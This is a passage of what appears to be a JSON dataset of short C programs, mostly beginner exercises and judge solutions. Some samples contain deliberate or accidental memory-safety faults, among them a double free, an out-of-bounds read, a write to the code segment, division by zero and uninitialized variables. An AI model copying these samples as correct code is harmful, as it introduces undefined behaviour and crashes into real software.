arabic%=1000;\n    if (arabic/100==1) {\n        printf(\"c\");\n    } else if (arabic/100>1) {\n        printf(\"%dc\",arabic/100);\n    }\n    arabic%=100;\n    if (arabic/10==1) {\n        printf(\"m\");\n    } else if (arabic/10>1) {\n        printf(\"%dm\",arabic/10);\n    }\n    arabic%=10;\n    if (arabic/1==1) {\n        printf(\"m\");\n    } else if (arabic/1>1) {\n        printf(\"%dm\",arabic/1);\n    }\n    arabic%=1;\n    printf(\"\\n\");\n}",
    "#include <math.h>\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <assert.h>\n#include <limits.h>\n#include <stdbool.h>\n\n\nlong int solve(long int n, long int m){\n    long int value = (long int)((n*m)-1);\n    return value;\n}\nint main() {\n    long int n;\n    long int m;\n    scanf(\"%ld %ld\", &n, &m);\n    long int result = solve(n, m);\n    printf(\"%ld\\n\", result);\n    return 0;\n}",
    "#include<stdio.h>\nint search(char[],char[]);\nvoid delete_word(char[],char[],int);\nint main()\n{\n  char str[100],word[30];\n  int index;\n  printf(\"Enter the string\\n\");\n  fgets(str,100,(stdin));\n  printf(\"Enter the word to be deleted\\n\");\n  scanf(\"%s\",word);\n  index=search(str,word);\n  if(index!=-1)\n  {\n    delete_word(str,word,index);\n    printf(\"The string without the word is:\\n%s\\n\",str);\n  }\n  else\n  printf(\"Word not present in the string\\n\");\n  return 0;\n}\nvoid delete_word(char str[],char word[],int index)\n{\n   int i,l;\n   for(l=0;word[l]!='\\0';l++);\n   for(i=index;str[i+l]!='\\0';i++)\n   str[i]=str[i+l+1];\n   str[i]='\\0';\n}\nint search(char str[],char word[])\n{\n    int i=0,j=0,len;\n    for(len=0;word[len]!='\\0';len++);\n    while(str[i]!='\\0' && word[j]!='\\0')\n    {\n      if(str[i]==word[j])\n      j++;\n      else\n      j=0;\n      i++;\n    }\n    if(j==len)\n    return (i-j);\n    else\n    return -1;\n}",
    "#include <stdio.h>\n#include <math.h>\n\nint main()\n{\nint r;\nfloat l, a;\nprintf(\"Introduce radio (entero): \");\nscanf(\"%d\", &r);\nl= (2*3.14159)*(r);\na= (pow(r,2)*3.14159);\nprintf(\"La longitud de la circunferencia vale %0.2f\\n\", l);\nprintf(\"El Area del circulo vale %0.2f\\n\", a);\n}",
    "#include <stdio.h>\nint main(void) {\n FILE *fp = fopen(\"d01_input\", \"r\");\n int incs = 0;\n int measure, tmp_measure;\n fscanf(fp, \"%i\", &measure);\n while (fscanf(fp, \"%i\", &tmp_measure) == 1)\n {\n  if (tmp_measure > measure)\n   incs++;\n  measure = tmp_measure;\n }\n    fclose(fp);\n printf(\"Increases = %i\\n\", incs);\n return incs;\n}",
    "#include <stdio.h>\nint main() {\n    int num;\n    scanf(\"%d\",&num);\n    while(num--){\n        int n;\n        scanf(\"%d\",&n);\n        int arr[n];\n        int count = 0;\n        for(int i=0;i<n;i++){\n            scanf(\"%d\",&arr[i]);\n            count = count + arr[i];\n        }\n        if(count%2 == 0)\n        printf(\"NO\\n\");\n        else\n        printf(\"YES\\n\");\n    }\n    return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n    for(int i=0;i<10;i++)\n    {\n        if(i==5)\n            continue;\n        printf(\"%d \",i);\n    }\n}",
    "#include <stdio.h>\nint fatorial (int numero)\n{\n    return numero == 0 ? 1 : numero * fatorial(numero - 1);\n}\nint main(void)\n{int n = 0;\n    scanf(\"%d\", &n);\n    printf(\"%d\\n\", fatorial(n));\n    return 0;\n}",
    "#include<stdio.h>\nint main()\n{\nint c;\nwhile((c=getchar())!=(-1))\n{\n if(c==' '|c=='\\t')\n  putchar('\\n');\n else\n  putchar (c);\n}\n}",
    "#include <stdio.h>\nint main()\n{\n    unsigned short n;\n    while (scanf(\"%hu\", &n) != (-1)) {\n        printf(\"%hu\\n\", n-1);\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main () {\n    int q, d, p, pag;\n    double re;\n    while (scanf (\"%d\", &q), q>0){\n        scanf (\" %d %d\", &d, &p);\n        re = (double)(q*d)/-(q-p);\n        pag = (re+d)*q;\n        if (pag==1)\n            printf (\"%d pagina\\n\", pag);\n        else\n            printf (\"%d paginas\\n\", pag);\n    }\n    return 0;\n}",
    "#include <math.h>\n#include <stdio.h>\nint main() {\n    double a;\n    scanf(\"%lf\", &a);\n    long long f = (long long)floor(a);\n    printf(\"%lld\", f);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n const char * mystrchr(const char * str, int character)\n {\n  int stringSize = strlen(str) + 1;\n  int i = 0;\n  char letter = (char)character;\n  while(str != ((void*)0))\n  {\n   if(str[i] == letter)\n   {\n    str = &str[i];\n    break;\n   }\n   else if(i == stringSize)\n   {\n    str = ((void*)0);\n   }\n   i++;\n  }\n  return str;\n }\n int main(int argc, char * argv[])\n {\n  int i = 0;\n  int stringSize = strlen(argv[1]);\n  char string[stringSize];\n  int character = argv[2][0];\n  char * charPointer;\n  while(argv[1][i] != '\\0')\n  {\n   string[i] = argv[1][i];\n   i++;\n  }\n  printf(\"Looking for the %c character in %s...\\n\", character, string);\n  charPointer = mystrchr(string, character);\n  while(charPointer != ((void*)0))\n  {\n   printf(\"Found the character %c at %ld\\n\", character, charPointer - string + 1);\n   charPointer = mystrchr(charPointer + 1, character);\n  }\n  return 0;\n }",
    "#include<stdio.h>\n int main()\n      {\n       int z,j,k,c,n;\n       long i,t;\n       scanf(\"%ld\",&t);\n       for(i=0;i<t;i++)\n         {\n          scanf(\"%d\",&n);\n          int d[n];\n          z=0;\n          for(j=0;j<n;j++)\n            scanf(\"%d\",&d[j]);\n          for(j=1;j<=100;j++)\n            {\n             c=0;\n       for(k=0;k<n;k++)\n               {\n                if(j==d[k])\n                  {\n                    c=1;\n                    break;\n          }\n         }\n       if(c==1)\n         z++;\n           }\n         printf(\"%d\\n\",z);\n          }\n      }",
    "#include <stdlib.h>\n\nint main (void) {\n    int *array = (int *) malloc (sizeof (int) * 123);\n    free (array);\n    free (array);\n}",
    "#include <stdio.h>\nvoid function_void(){\n    int a,b,c;\n    c = (a + b)/a*b;\n}\nint function_int(int a, int b) {\n    int c;\n    c = (a + b)/a*b;\n    return c;\n}\nint main(){\n    int i;\n    for (i = 1; i < 11; i++) {\n        printf(\"Iteration %d\\n\", function_int(i,i));\n        function_void();\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\nvoid copy(const char *srcPath, const char *destPath);\nint main()\n{\n    char path[4096];\n    char destPath[4096];\n    printf(\"Please enter path to file: \");\n    scanf(\"%s\", path);\n    printf(\"Please enter path to modified file:\");\n    scanf(\"%s\", destPath);\n    FILE *file = fopen(path , \"r\");\n    FILE *destFile = fopen(destPath, \"w\");\n    char buffer[4096 + 1];\n    if(file)\n    {\n        copy(path, destPath);\n        printf(\"Done!\\n\");\n    }\n    return 0;\n}\nvoid copy(const char *srcPath, const char *destPath)\n{\n    FILE *srcFile = fopen(srcPath, \"r\");\n    FILE *destFile = fopen(destPath, \"w\");\n    char buffer[4096];\n    while (!feof(srcFile))\n    {\n        size_t readBytes = fread(buffer, 1, 4096, srcFile);\n        fwrite(buffer, 1, readBytes, destFile);\n    }\n    fclose(destFile);\n    fclose(srcFile);\n}",
    "#include<stdio.h>\nint main()\n{\n int customerNumber, excessAmount;\n float unitsUsed, baseAmount, rateOfCharge, charges;\n printf(\"Enter Customer Number: \");\n scanf(\"%d\", &customerNumber);\n printf(\"Units Used: \");\n scanf(\"%f\", &unitsUsed);\n if(unitsUsed <= 200)\n {\n  rateOfCharge = 0.50;\n     excessAmount = 0;\n }\n else if (unitsUsed >= 201 && unitsUsed < 400)\n {\n  rateOfCharge = 0.65;\n     excessAmount = 100;\n }\n else if (unitsUsed >= 401 && unitsUsed <= 600)\n {\n  rateOfCharge = 0.80;\n     excessAmount = 230;\n }\n else if(unitsUsed >= 601)\n {\n  rateOfCharge = 1;\n     excessAmount = 390;\n }\n else { printf(\"Invalid\"); }\n baseAmount = rateOfCharge * unitsUsed;\n charges = baseAmount + excessAmount;\n printf(\"Your Customer Number is %d \\n\", customerNumber);\n printf(\"Units used: %.2f \\n\", unitsUsed);\n printf(\"Total Amount to be Paid is %.2f INR \\n\", charges);\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n    float grade1;\n    float grade2;\n    float grade3;\n    printf(\"Your grades ... \\n\");\n    scanf(\"%f\",&grade1);\n    scanf(\"%f\",&grade2);\n    scanf(\"%f\",&grade3);\n    float avg = (grade1 + grade2 +grade3)/3;\n    printf(\"Average : %.2f \\n\",avg);\n    if(avg>=90)\n        {\n        printf(\"you got A\\n\");\n    }\n    else if(avg>=80)\n        {\n        printf(\"you got B\\n\");\n    }\n    else if(avg>=70)\n        {\n        printf(\"you got C\\n\");\n    }\n    else\n    {\n        printf(\"You are Dump !\");\n    }\n}",
    "#include <stdio.h>\nint main()\n{\n int vec[100], i, idxMax=0;\n for(i=0; i < 100; i++)\n {\n  scanf(\"%d\",&vec[i]);\n  if(i>0)\n   if(vec[i] > vec[idxMax])\n    idxMax = i;\n }\n printf(\"%d\\n%d\\n\", vec[idxMax], idxMax+1);\n}",
    "#include <stdio.h>\n#include <string.h>\nint strend(char *, char *);\nint main() {\n    char *s = \"Hello\";\n    char *t = \"World\";\n    char *v = \"llo\";\n    if (strend(s, v))\n        printf(\"Found a comparision!\\n\");\n    else\n        printf(\"No match\\n\");\n}\nint strend(char *s, char *t) {\n    int i, j;\n    for (i = strlen(s), j = strlen(t); j >= 0 && *(s + i) == *(t + j); i--, j--)\n        ;\n    if (j < 0)\n        return 1;\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\nint main()\n{\n    int a[100], i, count = 100;\n    srand(time(((void*)0)));\n    for(i=0; i<count; i++){\n     a[i] = rand() % 1000;\n    }\n    printf(\"Array:\\n\");\n    for(i=0; i<count; i++){\n     printf(\"%8d\", a[i]);\n    }\n    int j, temp, iMin, step = 1;\n    for(i=0; i<count-1; i++){\n     iMin = i;\n     for(j=i+1; j<count; j++, step++){\n      if(a[j] < a[iMin]){\n       iMin = j;\n      }\n     }\n     if(iMin != i){\n      temp = a[i];\n      a[i] = a[iMin];\n      a[iMin] = temp;\n     }\n    }\n    printf(\"\\nSorted Array (Selection Sort): %d steps\\n\", step);\n    for(i=0; i<count; i++){\n     printf(\"%8d\", a[i]);\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n    char start;\n    int ascii_char;\n    int len;\n    printf(\"Enter start character: \");\n    scanf(\"%c\", &start);\n    ascii_char = (int)start;\n    len = ascii_char - (int)('A');\n    for (int i = 0; i < len + 1; i++)\n    {\n        for (int j = 0; j < i + 1; j++)\n        {\n            printf(\"%c\", ascii_char - j);\n        }\n        printf(\"\\n\");\n    }\n    return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n    char color;\n    printf(\"enter your favourite colours first letter\\n\");\n    scanf(\" %c\", &color);\n    switch(color){\n    case 'r' :\n    case 'R' : printf(\"red\\n\");\n    break;\n    case 'g' :\n    case 'G' : printf(\"green\\n\");\n    break;\n    case 'b' :\n    case'B' : printf(\"blue\\n\");\n    break;\n    default : printf(\"black\");\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n {\n   int i , n , a;\n   int sum;\n   printf(\"Enter value for n :\");\n   scanf(\"%d\",&n);\n   for(i=0 ; i<=n ; i++)\n   {\n   sum +=i;\n   }\n   printf(\"\\nSum =%d\" , sum) ;\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nint main(void)\n{\n    char reponse[20];\n    system(\"clear\");\n    printf(\"Voulez-vous voir un listing du dossier (oui/non):\");\n    scanf(\"%s\",reponse);\n    printf(\"reponse = %s\\n\",reponse);\n    if (strcmp(reponse, \"oui\") == 0) {\n        printf(\"------------ Test ------------ \\n\");\n        system(\"ls -lh\");\n    }\n    else {\n        printf(\"Dommage!\\n\");\n    }\n    return 0;\n}",
    "#include<stdio.h>\n#include<math.h>\n\nint main()\n{\n int n;\n double a, b;\n while((-1)!=scanf(\"%d\", &n))\n {\n  a = cos(3.141592654/n);\n  b = sin(3.141592654/n);\n  printf(\"%lf\\n\", (n-1)*a*b+b);\n  a = (n-1)*a*b+b;\n }\n return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n    int i,j;\n    int a[3][3]={1,2,3,4,5,6,7,8,9};\n    int b[3][3];\n    printf(\"Original array:\\n\");\n    for(i=0;i<3;i++){\n        for(j=0;j<3;j++){\n            printf(\"%d \",a[i][j]);\n            b[j][i]=a[i][j];\n        }\n        printf(\"\\n\");\n    }\n    printf(\"Transposed array:\\n\");\n    for(i=0;i<3;i++){\n        for(j=0;j<3;j++){\n            printf(\"%d \",b[i][j]);\n        }\n        printf(\"\\n\");\n    }\nreturn 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\nvoid countElements(int n, int vet[n]);\nint main()\n{\n    int vet[10], n = 10;\n    printf(\"Vetor: \");\n    for (int i = 0; i < n; i++)\n    {\n        vet[i] = rand () % 10;\n        printf(\"%d \", vet[i]);\n    }\n    printf(\"\\n\");\n    countElements(n, vet);\n    return 0;\n}\nvoid countElements(int n, int vet[n])\n{\n    int countVet[10] = {0};\n    for (int i = 0; i < n; i++)\n    {\n        int value = vet[i];\n        countVet[value]++;\n    }\n    for (int i = 0; i < n; i++)\n    {\n        printf(\"Contador do numero %d: %d \\n\", i, countVet[i]);\n    }\n}",
    "#include <stdio.h>\nint main(){\n int duracao_seg, minutos, horas;\n scanf(\"%d\",&duracao_seg);\n horas = duracao_seg / 3600;\n minutos = (duracao_seg - (horas * 3600)) / 60;\n duracao_seg = (duracao_seg - (horas * 3600) - (minutos * 60));\n printf(\"%d:%d:%d\\n\", horas, minutos, duracao_seg);\n return 0;\n}",
    "#include <stdio.h>\nint main() {\n  int five = 5;\n  int* wth;\n  int** why = &wth;\n  int*** norly = &why;\n  int**** seriz = &norly;\n  int***** noooo = &seriz;\n  int****** lame = &noooo;\n  wth = &five;\n  printf(\"five:  %p & %d\\n\", &five, five);\n  printf(\"wth:   %p & %d\\n\", wth, *wth);\n  printf(\"why:   %p & %d\\n\", why, **why);\n  printf(\"norly: %p & %d\\n\", norly, ***norly);\n  printf(\"seriz: %p & %d\\n\", seriz, ****seriz);\n  printf(\"noooo: %p & %d\\n\", noooo, *****noooo);\n  printf(\"lame:  %p & %d\\n\", lame, ******lame);\n  printf(\"llame: %p & %d\\n\", lame, ******lame);\n  printf(\"wth:   %p & %d\\n\", wth, *wth);\n  printf(\"wth:   %p & %d\\n\", why+1, *(why+1));\n  printf(\"wth:   %p & %d\\n\", norly+2, *(norly+2));\n  printf(\"wth:   %p & %d\\n\", seriz+3, *(seriz+3));\n  printf(\"wth:   %p & %d\\n\", noooo+4, *(noooo+4));\n  printf(\"wth:   %p & %d\\n\", lame+5, *(lame+5));\n  return 0;\n}",
    "#include<stdio.h>\n#include<string.h>\nint main()\n{\n        int hash[30]={0};\n        char inp[400],opt[400];\n        printf(\"Enter the Cipher text\\n\");\n        scanf(\"%s\",inp);\n        int len = strlen(inp);\n        int i;\n        printf(\"len = %d\\n\",len);\n        for(i=0;i<len;i++)\n        {\n                hash[inp[i]-65]=hash[inp[i]-65]+1;\n        }\n        int max=-101,max_idx=0;\n        for(i=0;i<26;i++)\n        {\n                if(hash[i]>max)\n                {\n                        max=hash[i];\n                        max_idx=i;\n                }\n        }\n        int k = max_idx -4;\n        printf(\"key = %d\\n\",k);\n        printf(\"max_idx =%d\\n\",k);\n        for(i=0;i<len;i++)\n        {\n                opt[i]=(inp[i]-65-k)%26;\n                if(opt[i]>0)\n                        opt[i]+=65;\n                else\n                        opt[i]+=91;\n        }\n        opt[len]='\\0';\n        printf(\"Deciphered code = %s\\n\",opt);\n        return 0;\n}",
    "#include <stdio.h>\nchar * fast(char * n)\n{\n    if(n[0] == 'G')\n    {\n      return \"Lion\";\n    }\n    if(n[0] == 'R')\n    {\n      return \"Tiger\";\n    }\n    if(n[0] == 'S')\n    {\n      return \"Snake\";\n    }\n    if(n[0] == 'C')\n    {\n      return \"Bird\";\n    }\n    return \"\";\n}\nint main()\n{\nchar in[256];\nshort ch = 0;\nwhile(scanf(\"%s\", in)==1)\n{\nprintf(\"%s\",fast(in));\nprintf(\" \");\n}\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n printf(\"Hello, world.\\n\");\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\nint main(void)\n{\n int i, random;\n for(i=0; i<=30; i++)\n {\n         srand(time(((void*)0)));\n  random = rand() % 10;\n  printf(\"%d \",random);\n }\n return 0;\n}",
    "#include <stdio.h>\nvoid show_short(unsigned short);\nvoid show_int(unsigned int);\nvoid show_long(unsigned long);\nvoid show_double(double);\nvoid show_float(float);\nint main()\n{\n unsigned short s = (unsigned short)0x123456789abcdef0;\n unsigned int i = (unsigned)0x123456789abcdef0;\n unsigned long l = (unsigned long)0x123456789abcdef0;\n double d = (double)0x123456789abcdef0;\n float f = (float)0x123456789abcdef0;\n printf(\"Representation of short int: %hd is: \", s);\n show_short(s);\n printf(\"\\n\");\n printf(\"Representation of int: %d is: \", i);\n show_int(i);\n printf(\"\\n\");\n printf(\"Representation of long int: %ld is: \", l);\n show_long(l);\n printf(\"\\n\");\n printf(\"Representation of double: %f is: \", d);\n show_double(d);\n printf(\"\\n\");\n printf(\"Representation of float: %f is: \", f);\n show_float(f);\n printf(\"\\n\");\n}\nvoid show_short(unsigned short s)\n{\n do{ char *p = (char *)&(s); int len = sizeof (short) / sizeof(char); for (int _ = 0; _ < len; ++_) printf(\"%02x \", 0xff&p[_]); } while(0);\n}\nvoid show_int(unsigned int i)\n{\n do{ char *p = (char *)&(i); int len = sizeof (int) / sizeof(char); for (int _ = 0; _ < len; ++_) printf(\"%02x \", 0xff&p[_]); } while(0);\n}\nvoid show_long(unsigned long l)\n{\n do{ char *p = (char *)&(l); int len = sizeof (long) / sizeof(char); for (int _ = 0; _ < len; ++_) printf(\"%02x \", 0xff&p[_]); } while(0);\n}\nvoid show_double(double d)\n{\n do{ char *p = (char *)&(d); int len = sizeof (double) / sizeof(char); for (int _ = 0; _ < len; ++_) printf(\"%02x \", 0xff&p[_]); } while(0);\n}\nvoid show_float(float f)\n{\n do{ char *p = (char *)&(f); int len = sizeof (float) / sizeof(char); for (int _ = 0; _ < len; ++_) printf(\"%02x \", 0xff&p[_]); } while(0);\n}",
    "#include <stdio.h>\nint main(){\n  float n, x, a, max;\n  scanf(\"%f\", &n);\n  scanf(\"%f\", &x);\n  scanf(\"%f\", &a);\n  max = a;\n  if(a < n){\n    max = n;\n  }\n  if(max < x){\n    max = x;\n  }\n  printf(\"%.1f\\n\", max);\n  return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n int n, tmp,dig;\n dig = 0;\n printf(\"Enter a number: \");\n scanf(\"%d\", &n);\n tmp = n;\n if(tmp!=0) {\n  while(tmp!=0) {\n   dig++;\n   tmp /= 10;\n  }\n }\n else {\n  dig = 1;\n }\n printf(\"The number %d has %d digits\\n\", n, dig);\n return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n    int i = 8;\n    while (i >= 4)\n        {\n           printf(\"i is: %d \\n\", i);\n           i--;\n        }\n        printf(\"That's it. \\n\");\n}",
    "#include <stdio.h>\nint main() {\n  int i;\n  unsigned char c = * ((unsigned char*)(&i));\n  printf(\"i=0x%x  c=0x%x\\n\",i,(int)c);\n  printf(\"i=0x%x  c=0x%x\\n\",i,(int)c);\n}",
    "#include<stdio.h>\nint main(void)\n{\n char i;\n i=getchar();\n if(i>='a'&&i<='w')\n {\n  printf(\"%c\",i+3);\n }\n else\n {\n  printf(\"%c\",i-23);\n }\n return 0;\n}",
    "#include <stdio.h>\nvoid strcppy(char *s,char *to)\n{\n    while(*s)\n    {\n        *to=*s;\n        to++;\n        s++;\n    }\n    *to='\\0';\n}\nint main()\n{\n    char str[]=\"hey buddy\";\n    char to[100];\n    strcppy(str,to);\n    printf(\"%s\",to);\n}",
    "#include<stdio.h>\n#include<stdlib.h>\nvoid change_array(double *, int, double);\nvoid print_array(double *, int, char *);\nint change_array_size(double **ar, int ar_size);\nint main(){\nint a_size = 10;\nint b_size = 10;\ndouble *a = calloc(a_size, sizeof(double));\nif (((void*)0) == a){\n printf(\"Memory was not assigned: line 2\");\n}\nfor(int indx = 0; indx < a_size; indx++){\n printf(\"a[%d] = %0.2lf\\n\", indx, *(a + indx));\n}\ndouble b[10] = {0};\nfor(int indx = 0; indx < a_size; indx++){\n printf(\"b[%d] = %0.2lf\\n\", indx, *(b + indx));\n}\nchange_array(a, a_size, 8.0);\nchange_array(b, b_size, 10.0);\nprint_array(a, a_size, \"array_a\");\nprint_array(b, b_size, \"array_b\");\na_size = change_array_size(&a, a_size);\nchange_array(a, a_size, 5.0);\nprint_array(a, a_size, \"array_a\");\nfree(a);\nreturn 0;\n}\nvoid print_array(double *ar, int ar_size, char *ar_name){\n for(int indx = 0; indx < ar_size; indx++){\n  printf(\"%s[%d] = %0.1lf\\n\",ar_name, indx, *(ar +indx));\n }\n}\nvoid change_array(double *ar, int ar_size, double val){\n for(int indx = 0; indx < ar_size; indx++){\n  *(ar+indx) = val;\n }\n}\nint change_array_size(double **ar, int ar_size){\n *ar = realloc(*ar, 2*ar_size*sizeof(double));\n if (((void*)0) == ar){\n  printf(\"Memory no allocoated in line 48\");\n }\nreturn 2*ar_size;\n}",
    "#include<stdio.h>\n#include<string.h>\n#include<malloc.h>\nunsigned char split_value(unsigned char val, unsigned char min, unsigned char max) {\n    if ( val > max) {\n        return 255;\n    } else if ( val < min ) {\n        return 0;\n    } else {\n        return val;\n    }\n}\nvoid rgb2yuv(unsigned char *rgbBuf, int w, int h, unsigned char *yuv) {\n    unsigned char *ptrRgb, *ptrY, *ptrU, *ptrV;\n    unsigned char r, g, b, y, u, v;\n    int i = 0, j = 0;\n    memset(yuv, 0, w * h * 3);\n    ptrY = yuv;\n    ptrV = ptrY + (w*h);\n    ptrU = ptrV + (w*h);\n    for( i = 0 ; i < w ; i++ ){\n        ptrRgb = rgbBuf + w * i * 3;\n        for( j = 0; j < h; j++) {\n            r = (*ptrRgb++);\n            g = (*ptrRgb++);\n            b = (*ptrRgb++);\n            y = (unsigned char)( ( 66 * r + 129 * g + 25 * b + 128) >> 8) + 16 ;\n   u = (unsigned char)( ( -38 * r - 74 * g + 112 * b + 128) >> 8) + 128 ;\n   v = (unsigned char)( ( 112 * r - 94 * g - 18 * b + 128) >> 8) + 128 ;\n            *ptrY++ = split_value(y,0,255);\n            *ptrU++ = split_value(u,0,255);\n            *ptrV++ = split_value(v,0,255);\n        }\n    }\n}\nint main() {\n    FILE *f1 = fopen(\"./lena_256x256_rgb24.rgb\", \"rb+\");\n    FILE *f2 = fopen(\"./lena_256x256_yv21.yuv\", \"wb+\");\n    unsigned char *rgb = (unsigned char*) malloc(256*256*3);\n    unsigned char *yuv = (unsigned char*) malloc(256*256*3);\n    fread(rgb, 1, 256 * 256 * 3, f1);\n    rgb2yuv(rgb, 256, 256, yuv);\n    fwrite(yuv, 1, 256 * 256 * 3, f2);\n    fclose(f1);\n    fclose(f2);\n    free(rgb);\n    free(yuv);\n    return 1;\n}",
    "#include <stdio.h>\nint add(int a, int b)\n{\n    return a + b;\n}\nint main()\n{\n    int n1 = 2, n2 = 3;\n    printf(\"%d \\n\", add(n1, n2));\n    return 0;\n}",
    "extern int printf(const char *fmt, ...);\nint main(int argc, char *argv[]) {\n    printf(\"Hello from user space!\\n\");\n    return 0;\n}",
    "#include <stdio.h>\nint main() {\n    int a, b;\n    scanf(\"%d\",&a);\n    scanf(\"%d\",&b);\n    printf(\"X = %d\\n\",a+b);\n    return 0;\n}",
    "#include <stdio.h>\nint main (){\n float n1,n2,med,op;\n do{\n  scanf(\"%f\",&n1);\n  while(n1<0 || n1>10){\n   printf(\"Nota Invalida 1\\n\");\n   scanf(\"%f\",&n1);\n  }\n  scanf(\"%f\",&n2);\n  while(n2<0 || n2>10){\n   printf(\"Nota Invalida 2\\n\");\n   scanf(\"%f\",&n2);\n  }\n  med=(n1+n2)/2;\n  printf(\"%.2f Media\\n\",med);\n  printf(\"Novo c\u00e1lculo (1.sim 2.n\u00e3o)? \");\n  scanf(\"%f\",&op);\n  while(op!=1 && op!=2 ){\n   printf(\"Novo c\u00e1lculo (1.sim 2.n\u00e3o)? \");\n   scanf(\"%f\",&op);\n  }\n }while(op == 1);\n return 0;\n}",
    "#include <stdio.h>\n\n\n\nint main(){\n    for(int i = 0;i<10;i+=1){\n        printf(\"i is %d\\n\", i);\n    }\n}",
    "#include <stdio.h>\nint main(){\n int contfim;\n scanf(\"%d\", &contfim);\n char animal;\n int cont, coelhos = 0, ratos = 0, sapos = 0, total = 0, atual;\n for(cont = 0; cont < contfim; cont++){\n  scanf(\"%d %c\", &atual, &animal);\n  total += atual;\n  if(animal == 'C') coelhos += atual;\n  else if(animal == 'R') ratos += atual;\n  else if(animal == 'S') sapos += atual;\n }\n printf(\"Total: %d cobaias\\n\", total);\n printf(\"Total de coelhos: %d\\n\", coelhos);\n printf(\"Total de ratos: %d\\n\", ratos);\n printf(\"Total de sapos: %d\\n\", sapos);\n printf(\"Percentual de coelhos: %.2f %%\\n\", (float) coelhos / total * 100);\n printf(\"Percentual de ratos: %.2f %%\\n\", (float) ratos / total * 100);\n printf(\"Percentual de sapos: %.2f %%\\n\", (float) sapos / total * 100);\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\nint\nmain()\n{\n  unsigned int *x = (unsigned int *) main;\n  printf(\"Trying to write to the text segment\\n\");\n  printf(\"This program should fail if the text segment is read-only.\\n\");\n  printf(\"However, the kernel should not crash...\\n\");\n  *x = 0x0000003f;\n  printf(\"IF THIS PRINTS, THE TEST FAILED\\n\");\n  exit(1);\n}",
    "#include<stdio.h>\n#include<math.h>\nint ifz(int);\nint main()\n{\n    int n,i;\n    scanf(\"%d\",&n);\n    for(i=n+1;ifz(i)==0;i++)\n    {\n    }\n    printf(\"%d\",i);\n}\nint ifz(int x)\n{\n    int m;\n    for(m=2;m<=sqrt(x);m++)\n    {\n        if(x%m==0)\n        {\n           return 0;\n        }\n    }\n    return 1;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\n#include<string.h>\nchar alp[27];\nint main ()\n{\n    alp[0] = 10;\n    alp[1] = 11;\n    alp[2] = 12;\n    alp[3] = 13;\n    alp[4] = 14;\n    alp[5] = 15;\n    alp[6] = 16;\n    alp[7] = 17;\n    alp[8] = 34;\n    alp[9] = 18;\n    alp[10] = 19;\n    alp[11] = 20;\n    alp[12] = 21;\n    alp[13] = 22;\n    alp[14] = 35;\n    alp[15] = 23;\n    alp[16] = 24;\n    alp[17] = 25;\n    alp[18] = 26;\n    alp[19] = 27;\n    alp[20] = 28;\n    alp[21] = 29;\n    alp[22] = 32;\n    alp[23] = 30;\n    alp[24] = 31;\n    alp[25] = 33;\n    char s[11];\n    scanf(\"%s\", s);\n    int sum = 0;\n    sum = alp[s[0]-'A']/10 + (alp[s[0]-'A']%10 )* 9 + (s[1]-'0') * 8 +\n            (s[2]-'0') * 7 + (s[3]-'0') * 6 + (s[4]-'0') * 5\n            + (s[5]-'0') * 4 + (s[6]-'0') * 3\n            + (s[7]-'0') * 2 + (s[8]-'0')+ (s[9]-'0');\n    if(sum % 10 == 0) printf(\"CORRECT!!!\");\n    else printf(\"WRONG!!!\");\n    printf(\"\\n\");\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\n\n\n\nint main () {\n int prime [8];\n printf (\"Enter %d four-digit prime numbers: \", 8);\n for (int i = 0; i < 8; i++)\n  scanf(\"%d\", &prime[i]);\n int L[10];\n srand (time(((void*)0)));\n for (int i = 0; i < 10; i++) {\n  L[i] = (rand() % 9) + 1;\n  for (int j = 1; j < 9; j++)\n   L[i] = L[i] * 10 + (rand() % 10);\n }\n printf (\"Prime Numbers ->\");\n for (int j = 0; j < 8; j++)\n  printf (\"%10d\", prime[j]);\n printf (\"\\n\");\n for (int i = 0; i < 100; i++)\n  printf (\"-\");\n printf (\"\\n\");\n for (int i = 0; i < 10; i++) {\n  printf (\"%15d \", L[i]);\n  for (int j = 0; j < 8; j++) {\n   int r = L[i] % prime[j];\n   printf (\"%10d\", r);\n  }\n  printf (\"\\n\");\n }\n return 0;\n}",
    "#include<stdio.h>\nint main(){\n int p1, u1, p2, u2;\n float v1, v2;\n scanf(\"%i%i%f\", &p1, &u1, &v1);\n scanf(\"%i%i%f\", &p2, &u2, &v2);\n printf(\"VALOR A PAGAR: R$ %.2f\\n\", u1 * v1 + u2 * v2);\n return 0;\n}",
    "#include <stdio.h>\nint main() {\n    double pi = 3.14159;\n    double raio;\n    scanf(\"%lf\", &raio);\n    double area = pi * (raio * raio);\n    printf(\"A=%.4lf\\n\", area);\n    return 0;\n}",
    "char str[10] = \"hello\";\nint main(void) {\n    return str[6];\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(int argc, char **argv) {\n  float u = 2.0f;\n  float v = -4.0f;\n  for (size_t i = 0; i < 90; i++) {\n    float w = 111.0f - 1130.f / v + 3000.0f / (u * v);\n    u = v;\n    v = w;\n  }\n  printf(\"%-16.12f\\n\", v);\n  return 0;\n}",
    "int main(void)\n{\n  int __negative = 1;\n  const int __max = __negative && 0 ;\n  __max / 0;\n}",
    "#include <stdio.h>\n#include <unistd.h>\nint main(){\nif(fork() && fork()){\nfork();\n}\nprintf(\"Hello\");\nreturn 0;\n}",
